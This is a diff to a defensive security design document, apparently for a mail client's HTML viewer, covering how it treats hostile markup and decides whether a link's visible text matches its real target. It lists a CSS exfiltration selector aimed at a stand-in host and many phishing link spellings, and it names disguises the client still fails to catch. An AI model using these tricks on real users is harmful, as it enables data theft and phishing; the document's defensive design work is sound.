@@ -49,7 +49,7 @@ does about the local attackers:
 | Tracking pixels | remote `<img>`, CSS `url()`, `@import`, `@font-face`, `<link>`, `srcset`, `<video poster>` | confirms address is live, leaks IP, time, client, sometimes read-receipts of forwarded mail |
 | CSS exfiltration | attribute selectors + `url()` (`input[value^="a"] { background: url(https://x/a) }`), `@font-face` unicode-range | leak of page content character by character |
 | Content spoofing / overlay | `position: fixed/absolute` overlays, z-index tricks, hidden text, `<form>` with our styling | phishing that looks like client UI |
-| Masked links | link text ≠ href, IDN homographs, a bank's name in the userinfo (`https://bank.example@evil.example/`, and with a character one URL parser refuses there while the browser does not: `https:// bank.example@evil.example/`), a text that reads as the bank's address to a person but not to a parser (a soft hyphen, zero-width or bidi character in its host, a space around an inline element, a trailing dot, a homoglyph, a backslash or fullwidth slash before the path, userinfo in the text), one href listed under two texts (an empty anchor, then the bank's), `data:` and `blob:` URLs | phishing |
+| Masked links | link text ≠ href, IDN homographs, a bank's name in the userinfo (`https://bank.example@evil.example/`, and with a character one URL parser refuses there while the browser does not: `https:// bank.example@evil.example/`), a text that reads as the bank's address to a person but not to a parser (a soft hyphen, zero-width or bidi character in its host, a space around an inline element, a trailing dot, a homoglyph, a backslash or fullwidth slash before the path, a colon another script draws or none at all, `https//bank.example`, a dot another script draws, userinfo in the text), a text the view draws otherwise than the daemon lists it (CSS that hides or clips part of it, markup that draws it right to left, padding past the daemon's cap on the listed text), one href listed under two texts, or under two spellings of one address (an empty anchor, then the bank's), `data:` and `blob:` URLs | phishing |
 | Frame / navigation | `<iframe>`, `<meta http-equiv=refresh>`, `<base href>` | loading arbitrary origins, rewriting relative links |
 | Resource exhaustion | deeply nested tags, huge documents, billion-laughs-style entity tricks, giant images | UI hang, memory exhaustion |
 | Mixed-content reference | `cid:` pointing to non-existent or foreign parts | confusion, occasional parser bugs |
@@ -220,18 +220,46 @@ fetch a page, both unseen by the filter:
   address the browser will get has its host on the text's site; that
   address never carries userinfo, so the question names the real host
   first. Every listed link with the clicked href is judged, not the
-  first, since a click cannot tell two anchors with one href apart. The
-  text is read as a person sees it: format and other default-ignorable
-  characters go first, it is read in NFKC with the ideographic full stop
-  as a dot, hosts are compared in punycode without a trailing dot, every
-  address in the text counts, and one that reads as an address but whose
-  host cannot be read (a space inside it, userinfo, an escape) names a
-  host no link leads to, so it is asked about. A single-label host (a
-  top-level domain, an intranet name) is no site of the hosts under it;
-  multi-label public suffixes such as `co.uk` are not known without a
-  public-suffix list, so `https://co.uk/` still counts as the site of a
-  text that names `bank.co.uk`. A link the launcher refuses is never
-  offered and says so in a toast
+  first, since a click cannot tell two anchors with one href apart, and
+  so is every listed link whose canonical form is the navigation's
+  (hrefs that differ only in case, a default port or escaping). The
+  text judged is the daemon's `links[].text`, which is not what the view
+  draws: the anchor's text nodes and image alts, joined with a space each
+  and cut at 200 runes. The client takes out of it what is invisible
+  (format and other default-ignorable characters), reads it in NFKC with
+  the ideographic full stop as a dot, compares hosts in punycode without
+  a trailing dot, and counts every address in it: a scheme with its colon
+  (or one another script draws) and a slash, http and https without one,
+  `www.`, and two slashes wherever they stand, after a letter too
+  (`https//bank.example`, and `…//:sptth`, an address markup draws right
+  to left); a start of an address the daemon's spaces split (`w ww.`,
+  `https :/ /`) is read without them. In a text that begins with an
+  address, a space ends the host unless the host visibly goes on after it
+  (the next word begins with a dot, has one before its first slash or
+  ends with one, or the word before the space ends with one):
+  `www.shop.example for details` names www.shop.example,
+  `https://moje banka.example/login` no host that can be read. An
+  address whose host cannot be read
+  (a space inside it, userinfo, an escape) names a host no link leads to,
+  so it is asked about. A text that holds no address is read as a host
+  whole, as in GTK (after a word and a colon, what follows the colon), and
+  one word with a dot another script draws between its labels or more
+  than one dot at its end names a host that cannot be read. A
+  single-label host (a top-level domain, an intranet name) is no site of
+  the hosts under it; multi-label public suffixes such as `co.uk` are not
+  known without a public-suffix list, so `https://co.uk/` still counts as
+  the site of a text that names `bank.co.uk`. What the client cannot see
+  still opens without the question, as known limits that need the daemon
+  to report what the view draws: part of the link's text that CSS hides
+  or clips (a hidden word before a bare host, a clipped address before
+  the one shown, padding that pushes the shown address past the 200-rune
+  cap), a bare host with a path that markup draws right to left
+  (`<bdo dir=rtl>`, `unicode-bidi: bidi-override`), a host an inline
+  element splits right after a host of the link's own site (drawn as
+  `https://evil.examplebank.example`), and a host without a
+  scheme or `www.` after words (`Log in at bank.example`), which GTK does
+  not read either; an e-mail address names no host. A link the launcher
+  refuses is never offered and says so in a toast
   ([windows-port.md §6.4](windows-port.md#64-links)).
   New windows, downloads, external schemes, frames, permissions,
   authentication, client certificates, certificate errors, screen capture
